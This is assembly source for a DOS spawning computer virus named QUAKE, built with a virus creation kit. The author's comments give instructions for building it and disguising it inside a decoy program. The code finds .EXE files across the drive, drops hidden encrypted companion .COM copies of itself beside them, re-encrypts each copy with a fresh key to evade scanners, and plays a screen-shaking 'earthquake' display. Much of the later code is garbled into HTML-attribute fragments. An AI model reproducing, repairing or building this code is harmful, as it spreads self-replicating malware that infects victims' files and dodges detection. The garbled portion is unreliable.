

; -----------------------------------------------------------------------------
; QUAKE.ASM
; Created with Nowhere Man's Virus Creation Laboratory v1.00
;
; Heavily modified VCL and Original Code by the best Bleeding Edge virus
; writer: Night Breeze.  See you all in fuckin' HELL!
;
; This is a "spawning" virus and, technically, a trojan horse.  First time it
; is run, it will do the earthquake thing - but only after infecting another
; file first!  When the infected file is executed (in it's directory) then it
; will infect another file and run the app.  Then, when all files on that drive
; are infected, it will again do the earthquake thing!
;
; Build instructions:
;
;        Assemble QUAKE.ASM to QUAKE.COM
;           d:\tasm\tasm /mx /m2 /q /t quake
;           link quake;
;           exe2bin quake.exe quake.com
;
;        Run QUAKE.COM and file the infected file...<g>
;           Find file
;           ATTRIB *.COM -r -h
;
;        Get a copy of that file as it is encrypted...
;           COPY filename.COM \mydir\TEMP.COM
;
;        Compile QINJECT.PAS
;
;        Cat the two files:
;           COPY /b TEMP.COM+QINJECT.EXE QUAKE.EXE  (i know, overwrites)
;
; Now, QINJECT actually as the same strings (most) as QUAKE.COM, so if the
; user types or debugs the program, will see the strings.  The REAL virus
; is hidden, and encrypted, at the start of QUAKE.EXE (it's really a com file).
;
; NOTE: The flag SHOW_FLAG is used to allow an intial infection, then to all
; the victim to see an apparently good program - although he is getting
; fucked :)
;
;
; If all that was too hard... just distribute the enclosed EARTH.EXE program:)
;
; -----------------------------------------------------------------------------
code            segment byte public
		assume  cs:code,ds:code,es:code,ss:code
		org     0100h

start           label   near

; -----------------------------------------------------------------------------
main            proc    near
		call    encrypt_decrypt         ; Decrypt the virus

start_of_code   label   near

                inc     Show_Flag               ; Inc infect count

		mov     si, offset spawn_name   ; Save a copy of the
		mov     di, offset save_name    ;   file to "spawn"
		cld
		mov     cx, 14                  ; It's allways 14 bytes
	rep     movsb

		call    search_files            ; Find and infect a file

		mov     al,byte ptr [set_carry] ; AX holds ALL INFECTED value
		cmp     al, 0                   ; Have we infected all files?
		jz      Effect                  ; If so, then do it!

                cmp     Show_Flag,3             ; Should we show display?
                jl      Effect
                jmp     short end00
Effect:
		call    EarthQuake              ; Let's do it!
                jmp     short Finito            ; And don't run app!
end00:
		mov     ah,04Ah                 ; DOS resize memory function
		mov     bx,(finish - start) / 16 + 0272h  ; BX holds # of para.
		int     021h

		mov     sp,(finish - start) + 01100h  ; Change top of stack

		mov     si,offset save_name     ; SI points to true filename
		int     02Eh                    ; DOS execution back-door
Finito:
		mov     ah,04Ch                 ; DOS terminate function
		int     021h
main            endp

; -----------------------------------------------------------------------------
search_files    proc    near
		push    bp                      ; Save BP
		mov     bp,sp                   ; BP points to local buffer
		sub     sp,64                   ; Allocate 64 bytes on stack

		mov     ah,047h                 ; DOS get current dir function
		xor     dl,dl                   ; DL holds drive # (current)
		lea     si,[bp - 64]            ; SI points to 64-byte buffer
		int     021h

		mov     ah,03Bh                 ; DOS change directory function
		mov     dx,offset root          ; DX points to root directory
		int     021h

		call    traverse                ; Start the traversal

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 64]            ; DX points to old directory
		int     021h

		mov     sp,bp                   ; Restore old stack pointer
		pop     bp                      ; Restore BP
		ret                             ; Return to caller

root            db      "\",0                   ; Root directory
search_files    endp

; -----------------------------------------------------------------------------
traverse        proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first function
		mov     cx,00010000b            ; CX holds search attributes
		mov     dx,offset all_files     ; DX points to "*.*"
		int     021h
		jc      leave_traverse          ; Leave if no files present

check_dir:      cmp     byte ptr [bp - 107],16  ; Is the file a directory?
		jne     another_dir             ; If not, try again
		cmp     byte ptr [bp - 98],'.'  ; Did we get a "." or ".."?
		je      another_dir             ;If so, keep going

		mov     ah,03Bh                 ; DOS change directory function
		lea     dx,[bp - 98]            ; DX points to new directory
		int     021h

		call    traverse                ; Recursively call ourself

		pushf                           ; Save the flags
		mov     ah,03Bh                 ; DOS change directory function
		mov     dx,offset up_dir        ; DX points to parent directory
		int     021h
		popf                            ; Restore the flags

		jnc     done_searching          ; If we infected then exit

another_dir:    mov     ah,04Fh                 ; DOS find next function
		int     021h
		jnc     check_dir               ; If found check the file

leave_traverse:
		mov     dx,offset exe_mask      ; DX points to "*.EXE"
		call    find_files              ; Try to infect a file
done_searching: mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller

up_dir          db      "..",0                  ; Parent directory name
all_files       db      "*.*",0                 ; Directories to search for
exe_mask        db      "*.EXE",0               ; Mask for all .EXE files
traverse        endp

; -----------------------------------------------------------------------------
find_files      proc    near
		push    bp                      ; Save BP

		mov     ah,02Fh                 ; DOS get DTA function
		int     021h
		push    bx                      ; Save old DTA address

		mov     bp,sp                   ; BP points to local buffer
		sub     sp,128                  ; Allocate 128 bytes on stack

		push    dx                      ; Save file mask
		mov     ah,01Ah                 ; DOS set DTA function
		lea     dx,[bp - 128]           ; DX points to buffer
		int     021h

		mov     ah,04Eh                 ; DOS find first file function
		mov     cx, 00100111b           ; CX holds all file attributes
		pop     dx                      ; Restore file mask
find_a_file:    int     021h
		jc      done_finding            ; Exit if no files found
		call    infect_file             ; Infect the file!
		jnc     done_finding            ; Exit if no error
		mov     ah,04Fh                 ; DOS find next file function
		jmp     short find_a_file       ; Try finding another file

done_finding:   mov     sp,bp                   ; Restore old stack frame
		mov     ah,01Ah                 ; DOS set DTA function
		pop     dx                      ; Retrieve old DTA address
		int     021h

		pop     bp                      ; Restore BP
		ret                             ; Return to caller
find_files      endp

; -----------------------------------------------------------------------------
infect_file     proc    near
		mov     ah,02Fh                 ; DOS get DTA address function
		int     021h
		mov     di,bx                   ; DI points to the DTA

		lea     si,[di + 01Eh]          ; SI points to file name
		mov     dx,si                   ; DX points to file name, too
		mov     di,offset spawn_name + 1; DI points to new name
		xor     ah,ah                   ; AH holds character count
transfer_loop:  lodsb                           ; Load a character
		or      al,al                   ; Is it a NULL?
		je      transfer_end            ; If so then leave the loop
		inc     ah                      ; Add one to the character count
		stosb                           ; Save the byte in the buffer
		jmp     short transfer_loop     ; Repeat the loop
transfer_end:
                mov     byte ptr [spawn_name],ah; First byte holds char. count
		mov     byte ptr [di],13        ; Make CR the final character

		mov     di,dx                   ; DI points to file name
		xor     ch,ch                   ;
		mov     cl,ah                   ; CX holds length of filename
		mov     al,'.'                  ; AL holds char. to search for
	repne   scasb                           ; Search for a dot in the name
		mov     word ptr [di],'OC'      ; Store "CO" as first two bytes
		mov     byte ptr [di + 2],'M'   ; Store "M" to make "COM"

		mov     byte ptr [set_carry],0  ; Assume we'll fail
		mov     ax,03D00h               ; DOS open file function, r/o
		int     021h
		jnc     infection_done          ; File already exists, so leave
		mov     byte ptr [set_carry],1  ; Success -- the file is OK

		mov     ah,03Ch                 ; DOS create file function
		mov     cx, 00100011b           ; CX holds file attributes
		int     021h
		xchg    bx,ax                   ; BX holds file handle

		call    encrypt_code            ; Write an encrypted copy

		mov     ah,03Eh                 ; DOS close file function
		int     021h

infection_done: cmp     byte ptr [set_carry],1  ; Set carry flag if failed
		ret                             ; Return to caller

; -----------------------------------------------------------------------------
spawn_name      db      0, 12 dup (?),13     ; Name for next spawn
save_name       db      0, 12 dup (?),13     ; Name for current spawn
show_flag       db      0                    ; When 0 & 1 then show display
set_carry       db      ?                    ; Set-carry-on-exit flag
infect_file     endp

; =============================================================================
EarthQuake      proc    near
                call InitCrt       ; Initialize the vars

                call DrawFrame     ; Draw a frame in middle of screen

                mov  cx, 2         ; Make some noise
                call Siren

                mov  si, OFFSET Warning  ; Put Msg 1
                mov  dx,0718h            ; Move to Row 8, column 20
                call WriteStr

                mov  cx, 1
                call Siren

                mov  si, OFFSET ToHills   ; Put Msg 2
                mov  dx,0A16h             ; Move to Row 10, column 18
                call WriteStr

                mov  cx, 2               ; More noise
                call Siren

                call Shake               ; Shake the screen - it's a quake!

                call DrawFrame     ; Draw a frame in middle of screen

                mov  si, OFFSET MadeIt  ; Put Made It Msg
                mov  dx,081Fh
                call WriteStr

                cmp  Show_Flag, 3
                jl   EarthDone
                mov  si, OFFSET BurmaShave  ; Put Logo
                mov  dx,0C36h
                call WriteStr
      EarthDone:
                ret
EarthQuake      endp

Warning         db  '* * * Earthquake Warning! * * *', 0
ToHills         db  'Head for the hills!  Take cover!!!', 0
MadeIt          db  'Whew!  We Made It!', 0
BurmaShave      db  '-=[VCL/BEv]=-', 0

Table struc        ; Structure of the Shaker Table
   Iters    db  0      ; Number of interations (quakes)
   Cols     db  0      ; Scroll number of columns
   Pause    dw  0      ; And then wait this much time
Table ends

QuakeTable      Table < 3,="" 1,="" 500="">
                Table < 4,="" 2,="" 250="">
                Table < 5,="" 3,="" 175="">
                Table < 6,="" 4,="" 100="">
                Table <10, 5,="" 30="">
                Table <20, 5,="" 10="">
                Table <10, 5,="" 30="">
                Table < 5,="" 4,="" 100="">
                Table < 4,="" 3,="" 175="">
                Table < 3,="" 2,="" 250="">
                Table < 2,="" 1,="" 500="">
                Table < 0,="" 0,="" 0="">       ; End of data

; -----------------------------------------------------------------------------
Shake           proc    near
                mov  si, OFFSET QuakeTable   ; Get pointer to table
                xor  cx,cx
   ShakeNext:
                mov  cl, [si].Iters
                jcxz ShakeDone
   ShakeInner:
                push cx                  ; Save for later
                push si                  ; ditto

                xor  ax,ax               ; duh...
                mov  al, [si].Cols       ; Number of columns to scroll
                push ax                  ; Get Ready
                call ScrollRight         ; Go...Scroll Screen to right
                pop  si                  ; Restore it

                cmp  [si].Cols, 3        ; Check if we are scrolling more than 3
                jle  ShakeCont1          ; If less or equal then skip vert scroll
                mov  ah, 6               ; Scroll up 1 line
                call Scroll              ; Do it.
   ShakeCont1:
                mov  cx, [si].Pause      ; delay period
                call Delay               ; Wait around a bit

                push si                  ; And save our table index for l8r
                xor  ax,ax               ; duh...
                mov  al, [si].Cols       ; Number of columns to scroll
                push ax                  ; Get Ready...Set...
                call ScrollLeft          ; Go! ... Scroll screen left
                pop  si                  ; And restore our table index

                cmp  [si].Cols, 3        ; Check if we are scrolling more than 3
                jle  ShakeCont2          ; If less or equal then skip vert scroll
                mov  ah, 7               ; Scroll up 1 line
                call Scroll              ; Do it.
   ShakeCont2:
                mov  cx, [si].Pause      ; pause again
                call Delay               ; Do it.

                pop  cx                  ; Get back our iteration counter
                Loop ShakeInner          ; Keep going
                add  si, 4               ; Move to next table element
                jmp  short ShakeNext     ; Keep on doing it...
  ShakeDone:
                ret
Shake           endp

; -----------------------------------------------------------------------------
; in: cx = number of times to do the siren
Siren           proc    near
     KeepGoing:
                push cx                ; Save the count
                mov  ax, 880           ; Freq
                mov  bx, 500           ; Duration = 1/2 second
                push ax                ; Put Freq on stack
                push bx                ; Put Duration on stack
                call Beep              ; Make a noise
                mov  ax, 660           ; Freq
                mov  bx, 500           ; Duration = 1/5 second
                push ax                ; Put Freq on stack
                push bx                ; Put Duration on stack
                call Beep              ; Make more noise
                pop  cx                ; Restore the count
                loop KeepGoing         ; So we can keep going
                ret
Siren           endp

; -----------------------------------------------------------------------------
; ds:si points to the null terminated string to print
; dx    has row/col -  dh=row
WriteStr        proc    near
                mov bh,0                ; We'll be working on page 0
     WriteMore:
                mov  al,[si]            ; get the next character to print
                cmp  al, 0              ; done yet?
                jz   WriteDone          ; Yep, so quit
                inc  si                 ; si++
                mov  ah,2               ; locate cursor at dx
                int  10h                ; do it
                push cx                 ; save it for later
                mov  cx,1               ; count of characters to write!
                mov  ah,10              ; subfunction 10
                int  10h                ; call bios to do our dirty work
                pop  cx                 ; get it back
                inc  dx                 ; move to next cursor position
                jmp short WriteMore     ; keep going for cx
     WriteDone:
                ret
WriteStr        endp

; -----------------------------------------------------------------------------
DrawFrame       proc    near
                push bp             ; Work around a stoopid bug in PC/XTs
                mov  ax, 0600h      ; Draw and clear the outer frame
                push ax             ; Save for later
                mov  cx, 050Ah      ; Upper screen coords: CH = ROW
                mov  dx, 0D46h      ; Lower bounds, DH = ROW
                mov  bh, 70h        ; Color is White Background, Black fore
                int  10h            ; Do It.

                pop  ax             ; Draw and clear the inner frame
                mov  cx, 060Ch      ; Upper screen coords: CH = ROW
                mov  dx, 0C44h      ; Lower bounds, DH = ROW
                mov  bh, 0Eh        ; Color is Black Background, Yellow fore
                int  10h            ; Do It Again
                pop  bp             ; End of stoopid fix
                ret
DrawFrame       endp

; =============================================================================
ScrollRight     proc    near
                push  bp
                mov   bp, sp
                mov   ax, [bp+4]      ; calc ColsToMove <- len="" shl="" 1="" shl="" ax,="" 1="" ;="" multiply="" by="" 2="" mov="" colstomove,="" ax="" ;="" and="" save="" it="" mov="" bx,="" numcols="" ;="" calc="" wordstoscroll=""></-><- numcols="" -="" len="" sub="" bx,="" ax="" ;="" adjust="" for="" scroll="" difference="" inc="" bx="" ;="" bx="WordsToScroll" mov="" ax,="" vidsegment="" ;="" put="" es="Video" segment="" mov="" es,="" ax="" xor="" ax,="" ax="" ;="" start="" on="" row="" 0="" aka="" 1="" sr_nextrow:="" push="" ax="" ;="" save="" for="" later="" mul="" linewidth="" ;="" ax="" now="" has="" row="" *="" linewidth="" push="" ax="" ;="" save="" start="" of="" row="" offset="" for="" printing="" add="" ax,="" linewidth="" ;="" ax="" points="" to="" last="" byte="" of="" the="" row="" sub="" ax,="" colstomove="" ;="" this="" moves="" back="" 1="" len="" of="" ch/attr="" pairs="" mov="" di,="" ax="" ;="" save="" in="" dest="" sub="" ax,="" colstomove="" ;="" ax="" now="" moves="" back="" another="" len="" pairs="" mov="" si,="" ax="" ;="" save="" in="" source="" mov="" cx,="" bx="" ;="" bx="Words" to="" scroll="" push="" ds="" ;="" stash="" this="" push="" es="" ;="" make="" ds="ES" pop="" ds="" ;="" like="" this="" std="" ;="" set="" si="" and="" di="" to="" decrement="" rep="" movsw="" pop="" ds="" ;="" get="" the="" ds="" back="" pop="" di="" ;="" grab="" the="" source="" offset="" we="" saved="" above="" mov="" cx,="" [bp+4]="" ;="" prepare="" to="" print="" len="" blanks="" call="" printblank="" pop="" ax="" ;="" saved="" row="" inc="" ax="" ;="" move="" to="" next="" row="" cmp="" ax,="" 25="" ;="" done="" with="" all="" rows?="" jne="" sr_nextrow="" ;="" no?="" then="" do="" next="" row!="" mov="" sp,="" bp="" pop="" bp="" ret="" 2="" scrollright="" endp="" ;="" -----------------------------------------------------------------------------="" scrollleft="" proc="" near="" push="" bp="" mov="" bp,="" sp="" mov="" ax,="" [bp+4]="" ;="" calc="" colstomove="" :="Len" shl="" 1="" shl="" ax,="" 1="" mov="" colstomove,="" ax="" mov="" bx,="" numcols="" ;="" calc="" wordstoscroll="" :="pred(NumCols)" shl="" 1="" mov="" ax,="" vidsegment="" ;="" make="" es="" point="" to="" the="" video="" segment="" mov="" es,="" ax="" mov="" es,="" ax="" xor="" ax,="" ax="" ;="" start="" on="" row="" 0="" aka="" 1="" sl_nextrow:="" push="" ax="" ;="" save="" row="" for="" later="" mul="" linewidth="" ;="" calc="" ax="" :="Row" *="" linewidth="" push="" ax="" ;="" save="" start="" of="" line="" mov="" di,="" ax="" ;="" this="" is="" where="" it's="" going="" add="" ax,="" colstomove="" ;="" calc="" ax="" :="AX" +="" colstomove="" mov="" si,="" ax="" ;="" this="" will="" be="" our="" source="" push="" ds="" ;="" stash="" for="" later="" ...="" push="" es="" ;="" make="" ds="ES" =="" video="" segment="" pop="" ds="" mov="" cx,="" bx="" ;="" bx="Words" to="" scroll="" cld="" ;="" set="" si="" and="" di="" to="" decrement="" rep="" movsw="" pop="" ds="" ;="" get="" our="" ds="" back...="" pop="" di="" ;="" grab="" the="" source="" offset="" we="" saved="" add="" di,="" linewidth="" sub="" di,="" colstomove="" mov="" cx,="" [bp+4]="" ;="" prepare="" to="" print="" some="" blanks="" call="" printblank="" ;="" do="" it="" pop="" ax="" ;="" get="" back="" out="" row="" value="" inc="" ax="" ;="" and="" move="" to="" next="" row="" cmp="" ax,="" 25="" ;="" first="" check="" if="" we="" are="" done="" jne="" sl_nextrow="" ;="" if="" now,="" then="" do="" next="" row="" mov="" sp,="" bp="" pop="" bp="" ret="" 2="" scrollleft="" endp="" ;="" -----------------------------------------------------------------------------="" ;="" in="" ah="6" scroll="" up="" ;="7" scroll="" down="" scroll="" proc="" near="" mov="" al,="" 1="" ;="" we="" will="" always="" scroll="" 1="" line="" xor="" cx,="" cx="" ;="" set="" top="" row/col="" to="" (0,0)="" mov="" dx,="" 184fh="" ;="" set="" bottom="" row/col="" to="" (24,79)="" mov="" bh,="" 07h="" ;="" use="" a="" normal="" blank="" push="" bp="" ;="" work="" around="" a="" lame="" bug="" on="" pc/xts="" int="" 10h="" ;="" do="" bios...oh="" do="" me="" now="" pop="" bp="" ;="" and="" continue="" fixing="" that="" st00pid="" bug="" ret="" ;="" i="" really="" feel="" sill="" doc'g="" this="" routine...="" scroll="" endp="" ;="" -----------------------------------------------------------------------------="" printblank="" proc="" near="" ;="" in="" es="" -="" video="" segment="" ;="" di="" -="" offset="" to="" print="" blank="" at="" ;="" cx="" -="" number="" of="" blanks="" to="" print="" cld="" ;="" store="" forward="" (increment="" di)="" mov="" al,'="" '="" ;="" we="" want="" to="" print="" a="" blank="" printagain:="" stosb="" ;="" put="" in="" one="" blank="" char="" inc="" di="" ;="" skip="" video="" attribute="" loop="" short="" printagain="" ret="" printblank="" endp="" ;="" -----------------------------------------------------------------------------="" ;="" all="" the="" routines="" dealing="" with="" sound="" and="" delays="" -="" especially="" the="" delay="" ;="" calibration="" routine="" were="" mostly="" stolen="" from="" kim="" kokkonen's="" code="" in="" earlier="" ;="" version="" of="" turbo="" professional.="" kk="" is="" the="" owner="" of="" turbo="" power="" -="" a="" damn="" good="" ;="" set="" of="" programming="" tools="" -="" plug="" plug!="" ;="" beep(hz,="" ms:word);="" assembler;="" beep="" proc="" near="" push="" bp="" mov="" bp,="" sp="" mov="" bx,="" [bp+6]="" ;="" hertz="" mov="" ax,34ddh="" mov="" dx,0012h="" cmp="" dx,bx="" jnc="" beepstop="" div="" bx="" mov="" bx,ax="" ;="" lots="" of="" port="" tweaking...="" isn't="" in="" al,61h="" ;="" this="" shit="" fun???="" test="" al,3="" jnz="" @99="" or="" al,3="" out="" 61h,al="" mov="" al,0b6h="" out="" 43h,al="" @99:="" mov="" al,bl="" ;="" i="" know="" i="" never="" get="" bored.!!="" out="" 42h,al="" mov="" al,bh="" out="" 42h,al="" beepstop:="" mov="" cx,="" [bp+4]="" ;="" push="" ms="" delay="" time="" call="" delay="" ;="" and="" wait...="" in="" al,="" 61h="" ;="" now="" turn="" off="" the="" speaker="" and="" al,="" 0fch="" out="" 061h,="" al="" mov="" sp,="" bp="" pop="" bp="" ret="" 4="" beep="" endp="" ;="" -----------------------------------------------------------------------------="" ;="" in:="" cx="delay" in="" ms="" delay="" proc="" near="" delay1:="" ;="" what's="" to="" say...="" a="" tight="" loop="" call="" delayonems="" ;="" counting="" milliseconds="" loop="" short="" delay1="" ret="" delay="" endp="" ;="============================================================================" delayonems="" proc="" near="" push="" cx="" ;="" save="" cx="" mov="" cx,="" onems="" ;="" loop="" count="" into="" cx="" delayone1:="" loop="" delayone1="" ;="" wait="" one="" millisecond="" pop="" cx="" ;="" restore="" cx="" ret="" delayonems="" endp="" ;="" -----------------------------------------------------------------------------="" calibrate_delay="" proc="" near="" mov="" ax,40h="" mov="" es,ax="" mov="" di,6ch="" ;="" es:di="" is="" the="" low="" word="" of="" bios="" timer="" count="" mov="" onems,="" 55="" ;="" initial="" value="" for="" one="" ms's="" time="" xor="" dx,dx="" ;="" dx="0" mov="" ax,es:[di]="" ;="" ax="low" word="" of="" timer="" calkeepon:="" cmp="" ax,es:[di]="" ;="" keep="" looking="" at="" low="" word="" of="" timer="" je="" calkeepon="" ;="" until="" its="" value="" changes...="" mov="" ax,es:[di]="" ;="" ...then="" save="" it="" caldomore:="" call="" delayonems="" ;="" delay="" for="" a="" count="" of="" onems="" (55)="" inc="" dx="" ;="" increment="" loop="" counter="" cmp="" ax,es:[di]="" ;="" keep="" looping="" until="" the="" low="" word...="" je="" caldomore="" ;="" ...of="" the="" timer="" count="" changes="" again="" mov="" onems,="" dx="" ;="" dx="" has="" new="" onems="" }="" ret="" calibrate_delay="" endp="" ;="" -----------------------------------------------------------------------------="" initcrt="" proc="" near="" mov="" ah,15="" ;="" get="" video="" mode="" int="" 10h="" cmp="" al,="" 7="" ;="" check="" if="" this="" is="" monochrome="" je="" doneinit="" add="" vidsegment,="" 800h="" doneinit:="" mov="" byte="" ptr="" numcols,="" ah="" ;="" set="" the="" number="" of="" character="" cols="" shl="" ah,="" 1="" ;="" mult="" by="" two="" for="" number="" of="" vid="" bytes="" mov="" byte="" ptr="" linewidth,="" ah="" ;="" and="" stash="" it...="" toneinit:="" call="" calibrate_delay="" ret="" initcrt="" endp="" ;="============================================================================" vidsegment="" dw="" 0b000h="" ;="" base="" video="" segment="" numcols="" dw="" ;="" columns="" on="" screen="" linewidth="" dw="" ;="" numcols="" *="" 2="" colstomove="" dw="" ;="" number="" of="" video="" bytes="" to="" move="" each="" time="" onems="" dw="" ;="" calibration="" value="" for="" 1="" ms="" of="" time="" ;="============================================================================" encrypt_code="" proc="" near="" mov="" si,offset="" encrypt_decrypt;="" si="" points="" to="" cipher="" routine="" xor="" ah,ah="" ;="" bios="" get="" time="" function="" int="" 01ah="" mov="" word="" ptr="" [si="" +="" 9],dx="" ;="" low="" word="" of="" timer="" is="" new="" key="" xor="" byte="" ptr="" [si],1="" ;="" xor="" byte="" ptr="" [si="" +="" 8],1="" ;="" change="" all="" sis="" to="" dis="" xor="" word="" ptr="" [si="" +="" 11],0101h;="" (and="" vice-versa)="" mov="" di,offset="" finish="" ;="" copy="" routine="" into="" heap="" mov="" cx,finish="" -="" encrypt_decrypt="" -="" 1="" ;="" all="" but="" final="" ret="" push="" si="" ;="" save="" si="" for="" later="" push="" cx="" ;="" save="" cx="" for="" later="" rep="" movsb="" ;="" copy="" the="" bytes="" mov="" si,offset="" write_stuff="" ;="" si="" points="" to="" write="" stuff="" mov="" cx,5="" ;="" cx="" holds="" length="" of="" write="" rep="" movsb="" ;="" copy="" the="" bytes="" pop="" cx="" ;="" restore="" cx="" pop="" si="" ;="" restore="" si="" inc="" cx="" ;="" copy="" the="" ret="" also="" this="" time="" rep="" movsb="" ;="" copy="" the="" routine="" again="" mov="" ah,040h="" ;="" dos="" write="" to="" file="" function="" mov="" dx,offset="" start="" ;="" dx="" points="" to="" virus="" call="" finish="" ;="" encrypt/write/decrypt="" ret="" ;="" return="" to="" caller="" write_stuff:="" mov="" cx,finish="" -="" start="" ;="" length="" of="" code="" int="" 021h="" encrypt_code="" endp="" end_of_code="" label="" near="" ;="" -----------------------------------------------------------------------------="" encrypt_decrypt="" proc="" near="" mov="" si,offset="" start_of_code="" ;="" si="" points="" to="" code="" to="" decrypt="" nop="" ;="" defeat="" scan="" 95b="" mov="" cx,(end_of_code="" -="" start_of_code)="" 2="" ;="" cx="" holds="" length="" xor_loop:="" db="" 081h,034h,00h,00h="" ;="" xor="" a="" word="" by="" the="" key="" inc="" si="" ;="" do="" the="" next="" word="" inc="" si="" ;="" loop="" xor_loop="" ;="" loop="" until="" we're="" through="" ret="" ;="" return="" to="" caller="" encrypt_decrypt="" endp="" finish="" label="" near="" code="" ends="" end="" main="" =""></-></10,></20,></10,></g>